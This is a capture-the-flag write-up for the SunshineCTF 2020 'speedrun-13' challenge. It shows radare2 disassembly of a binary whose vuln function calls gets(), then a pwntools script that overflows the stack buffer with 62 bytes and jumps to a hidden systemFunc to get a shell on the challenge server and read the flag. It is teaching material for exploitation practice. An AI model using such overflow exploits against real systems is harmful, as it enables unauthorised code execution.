# speedrun-13

## Task

nc chal.2020.sunshinectf.org 30013

File: chall_13

Tags: binary exploitation, stack buffer overflow

## Solution

Weird, I don't understand the sorting of these challenges.

```nasm
[0x080483c0]> afl
0x080483c0    1 50           entry0
0x080483f3    1 4            fcn.080483f3
0x080483a0    1 6            sym.imp.__libc_start_main
0x08048420    4 50   -> 41   sym.deregister_tm_clones
0x08048460    4 58   -> 54   sym.register_tm_clones
0x080484a0    3 34   -> 31   sym.__do_global_dtors_aux
0x080484d0    1 6            entry.init0
0x080485f0    1 2            sym.__libc_csu_fini
0x08048410    1 4            sym.__x86.get_pc_thunk.bx
0x08048501    1 40           sym.vuln
0x08048582    1 4            sym.__x86.get_pc_thunk.ax
0x08048360    1 6            sym.imp.gets
0x080485f4    1 20           sym._fini
0x08048590    4 93           sym.__libc_csu_init
0x08048400    1 2            sym._dl_relocate_static_pie
0x080484d6    1 43           sym.systemFunc
0x08048390    1 6            sym.imp.system
0x08048529    1 89           main
0x08048380    1 6            sym.imp.puts
0x08048370    1 6            sym.imp.fgets
0x08048324    3 35           sym._init
[0x080483c0]> pdf@sym.vuln
            ; CALL XREF from main @ 0x8048572
┌ 40: sym.vuln ();
│           ; var char *s @ ebp-0x3a
│           ; var int32_t var_4h @ ebp-0x4
│           0x08048501      55             push ebp
│           0x08048502      89e5           mov ebp, esp
│           0x08048504      53             push ebx
│           0x08048505      83ec44         sub esp, 0x44
│           0x08048508      e875000000     call sym.__x86.get_pc_thunk.ax
│           0x0804850d      05f31a0000     add eax, 0x1af3
│           0x08048512      83ec0c         sub esp, 0xc
│           0x08048515      8d55c6         lea edx, [s]
│           0x08048518      52             push edx                    ; char *s
│           0x08048519      89c3           mov ebx, eax
│           0x0804851b      e840feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x08048520      83c410         add esp, 0x10
│           0x08048523      90             nop
│           0x08048524      8b5dfc         mov ebx, dword [var_4h]
│           0x08048527      c9             leave
└           0x08048528      c3             ret
[0x080483c0]> pdf@sym.systemFunc
┌ 43: sym.systemFunc ();
│           ; var int32_t var_4h @ ebp-0x4
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec04         sub esp, 4
│           0x080484dd      e8a0000000     call sym.__x86.get_pc_thunk.ax
│           0x080484e2      051e1b0000     add eax, 0x1b1e
│           0x080484e7      83ec0c         sub esp, 0xc
│           0x080484ea      8d9010e6ffff   lea edx, [eax - 0x19f0]
│           0x080484f0      52             push edx                    ; const char *string
│           0x080484f1      89c3           mov ebx, eax
│           0x080484f3      e898feffff     call sym.imp.system         ; int system(const char *string)
│           0x080484f8      83c410         add esp, 0x10
│           0x080484fb      90             nop
│           0x080484fc      8b5dfc         mov ebx, dword [var_4h]
│           0x080484ff      c9             leave
└           0x08048500      c3             ret
```

This is just a buffer overflow?!

Determine offset with gdb peda and pattern, write script:

```python
from pwn import *

e = ELF("./chall_13", checksec=False)

#p = e.process()
p = remote("chal.2020.sunshinectf.org", 30013)

payload  = "A" * 62
payload += p32(e.sym["systemFunc"])

p.sendline()
p.sendline(payload)
p.recvline()

p.interactive()
```

And there you go:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done
[*] Switching to interactive mode
$ ls
chall_13
flag.txt
$ cat flag.txt
sun{almost-easy-61ddd735cf9053b0}
```
